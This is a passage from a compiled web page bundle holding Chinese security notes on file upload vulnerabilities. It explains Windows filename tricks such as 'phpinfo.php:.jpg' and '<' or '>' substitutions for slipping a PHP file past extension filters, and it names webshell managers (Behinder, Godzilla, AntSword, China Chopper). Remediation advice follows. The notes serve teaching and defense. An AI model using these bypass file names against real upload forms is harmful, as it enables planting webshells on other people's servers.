\u4e0d\u88ab\u652f\u6301\u3002"}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5176\u4f59\u53ef\u76f4\u63a5\u4e0a\u7f51\u67e5\u5229\u7528\u65b9\u5f0f"}),"\n",(0,i.jsx)(n.h5,{id:"\u5229\u7528-windows-\u73af\u5883\u7684\u53e0\u52a0\u7279\u5f81\u7ed5\u8fc7",children:"\u5229\u7528 windows \u73af\u5883\u7684\u53e0\u52a0\u7279\u5f81\u7ed5\u8fc7"}),"\n",(0,i.jsxs)(n.p,{children:["\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u6587\u4ef6\u7cfb\u7edf\u6709\u4e00\u5b9a\u7684\u89c4\u5219\u6765\u5904\u7406\u6587\u4ef6\u540d\u3002\u5f53\u4e00\u4e2a\u6587\u4ef6\u4ee5\u7279\u5b9a\u7684\u65b9\u5f0f\u547d\u540d\u65f6\uff0c\u6bd4\u5982 ",(0,i.jsx)(n.code,{children:"phpinfo.php:.jpg"}),"\uff0cWindows\u53ef\u80fd\u4f1a\u622a\u65ad\u6216\u5ffd\u7565\u6587\u4ef6\u540d\u4e2d\u67d0\u4e9b\u7279\u6b8a\u5b57\u7b26\u540e\u9762\u7684\u90e8\u5206\u3002\u8fd9\u662f\u56e0\u4e3a ",(0,i.jsx)(n.code,{children:":"})," \u5728Windows\u4e2d\u662f\u4e00\u4e2a\u7528\u4e8e\u8868\u793a\u5377\u6807\u6216\u9a71\u52a8\u5668\u7684\u7279\u6b8a\u5b57\u7b26\uff0c\u800c\u5728\u6587\u4ef6\u540d\u4e2d\u901a\u5e38\u4e0d\u88ab\u5141\u8bb8\u3002\u5f53\u4f60\u5c1d\u8bd5\u4e0a\u4f20\u4e00\u4e2a\u540d\u4e3a ",(0,i.jsx)(n.code,{children:"phpinfo.php:.jpg"})," \u7684\u6587\u4ef6\u65f6\uff0cWindows\u53ef\u80fd\u4f1a\u5c06\u6587\u4ef6\u540d\u622a\u65ad\u4e3a ",(0,i.jsx)(n.code,{children:"phpinfo.php"}),"\uff0c\u56e0\u4e3a ",(0,i.jsx)(n.code,{children:":"})," \u540e\u9762\u7684\u90e8\u5206\u88ab\u89c6\u4e3a\u5bf9\u6587\u4ef6\u7cfb\u7edf\u7684\u6307\u4ee4\uff0c\u800c\u4e0d\u662f\u6587\u4ef6\u540d\u7684\u4e00\u90e8\u5206\u3002\u8fd9\u6837\uff0c\u5c31\u4f1a\u5728\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a ",(0,i.jsx)(n.code,{children:"phpinfo.php"})," \u7684\u7a7a\u767d\u6587\u4ef6"]}),"\n",(0,i.jsx)(n.p,{children:"Windows\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u4ee5\u4e0b\u7b26\u53f7\u5728\u6b63\u5219\u5339\u914d\u65f6\u53ef\u80fd\u88ab\u89c6\u4e3a\u76f8\u7b49\uff1a"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u53cc\u5f15\u53f7 ",(0,i.jsx)(n.code,{children:'"'})," \u7b49\u4e8e \u70b9\u53f7 ",(0,i.jsx)(n.code,{children:"."})]}),"\n",(0,i.jsxs)(n.li,{children:["\u5927\u4e8e\u7b26\u53f7 ",(0,i.jsx)(n.code,{children:">"})," \u7b49\u4e8e \u95ee\u53f7 ",(0,i.jsx)(n.code,{children:"?"})]}),"\n",(0,i.jsxs)(n.li,{children:["\u5c0f\u4e8e\u7b26\u53f7 ",(0,i.jsx)(n.code,{children:"<"})," \u7b49\u4e8e \u661f\u53f7 ",(0,i.jsx)(n.code,{children:"*"})]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"\u6587\u4ef6\u540d.<"}),"\u3001",(0,i.jsx)(n.code,{children:"\u6587\u4ef6\u540d.<<<"}),"\u3001",(0,i.jsx)(n.code,{children:"\u6587\u4ef6\u540d.>>>"})," \u6216 ",(0,i.jsx)(n.code,{children:"\u6587\u4ef6\u540d.>><\u7a7a\u6587\u4ef6\u540d"})," \u65f6\uff0c\u8fd9\u4e9b\u662f\u5728\u5c1d\u8bd5\u5229\u7528Windows\u6587\u4ef6\u7cfb\u7edf\u7684\u7279\u6027\u6765\u521b\u5efa\u7279\u6b8a\u7684\u6587\u4ef6\u540d\uff0c\u8fd9\u4e9b\u6587\u4ef6\u540d\u4f1a\u5728\u6587\u4ef6\u7cfb\u7edf\u4e2d\u88ab\u89e3\u91ca\u4e3a\u4e0d\u540c\u7684\u4e1c\u897f\uff0c\u6216\u8005\u5bfc\u81f4\u6587\u4ef6\u540d\u7684\u4e00\u90e8\u5206\u88ab\u5ffd\u7565"]}),"\n",(0,i.jsx)(n.h3,{id:"\u6f0f\u6d1e\u4fee\u590d",children:"\u6f0f\u6d1e\u4fee\u590d"}),"\n",(0,i.jsx)(n.p,{children:"1.\u5bf9\u6587\u4ef6\u4e0a\u4f20\u7c7b\u578b\u8fdb\u884c\u9a8c\u8bc1\uff0c\u9664\u4e86\u5728\u524d\u7aef\u9a8c\u8bc1\u5916\uff0c\u5728\u540e\u7aef\u4e5f\u8981\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5728\u540e\u7aef\u53ef\u4ee5\u8fdb\u884c\u6269\u5c55\u540d\u9a8c\u8bc1\uff08\u8bbe\u7f6e\u767d\u540d\u5355\uff09\u3001MIME\u7c7b\u578b\u68c0\u6d4b\uff1b"}),"\n",(0,i.jsx)(n.p,{children:"2.\u91cd\u547d\u540d\u4e0a\u4f20\u540e\u7684\u6587\u4ef6\uff0c\u6216\u8005\u76f4\u63a5uuid\u751f\u6210\u6587\u4ef6\u540d\uff0c\u9650\u5236\u6587\u4ef6\u4e0a\u4f20\u7684\u5927\u5c0f\uff0c\u5c06\u4e0a\u4f20\u7684\u6587\u4ef6\u653e\u5728\u5176\u4ed6\u6587\u4ef6\u5b58\u50a8\u670d\u52a1\u5668\u4e2d"}),"\n",(0,i.jsx)(n.p,{children:"3.\u4e25\u683c\u9650\u5236\u548c\u6821\u9a8c\u4e0a\u4f20\u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u7981\u6b62\u4e0a\u4f20\u5b58\u5728\u6076\u610f\u4ee3\u7801\u7684\u6587\u4ef6\uff0c\u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u76ee\u5f55\u7684\u6267\u884c\u6743\u9650\uff0c\u9632\u6b62\u6728\u9a6c\u6587\u4ef6\u88ab\u6267\u884c"}),"\n",(0,i.jsx)(n.p,{children:"4.\u5bf9\u4e0a\u4f20\u6587\u5316\u683c\u5f0f\u8fdb\u884c\u6821\u9a8c\uff0c\u9632\u6b62\u4e0a\u4f20\u6076\u610f\u811a\u672c\u6587\u4ef6"}),"\n",(0,i.jsx)(n.p,{children:"5.\u4e25\u683c\u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u4fdd\u5b58\u8def\u5f84\uff0c\u9690\u85cf\u4e0a\u4f20\u6587\u4ef6\u8def\u5f84\u4e0d\u505a\u56de\u663e"}),"\n",(0,i.jsx)(n.p,{children:"6.\u4fee\u590d\u4e2d\u95f4\u4ef6\u6f0f\u6d1e\uff0c\u5bf9\u5176\u8fdb\u884c\u5b89\u5168\u914d\u7f6e\uff0c\u6216\u8005\u4f7f\u7528\u7248\u672c\u76f8\u5bf9\u8f83\u9ad8\u7684\u4e2d\u95f4\u4ef6\uff0c\u5408\u7406\u907f\u5f00\u5b58\u5728\u89e3\u6790\u6f0f\u6d1e\u7684\u7248\u672c"}),"\n",(0,i.jsx)(n.h3,{id:"webshell\u7ba1\u7406\u5de5\u5177",children:"webshell\u7ba1\u7406\u5de5\u5177"}),"\n",(0,i.jsx)(n.p,{children:"\u51b0\u874e\uff08Behinder\uff09\u3001\u54e5\u65af\u62c9\u3001\u8681\u5251\u3001\u4e2d\u56fd\u83dc\u5200"}),"\n",(0,i.jsx)(n.h3,{id:"\u53c2\u8003\u6587\u7ae0",children:"\u53c2\u8003\u6587\u7ae0"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"https://www.cnblogs.com/yokan/p/15252077.html",children:"\u6587\u4ef6\u4e0a\u4f20\u5229\u7528\u603b\u7ed3 - yokan - \u535a\u5ba2\u56ed"})})]})}function a(e={}){const{wrapper:n}={...(0,d.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(p,{...e})}):p(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>c,x:()=>l});var s=r(6540);const i={},d=s.createContext(i);function c(e){const n=s.useContext(d);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:c(e.components),s.createElement(d.Provider,{value:n},e.children)}}}]);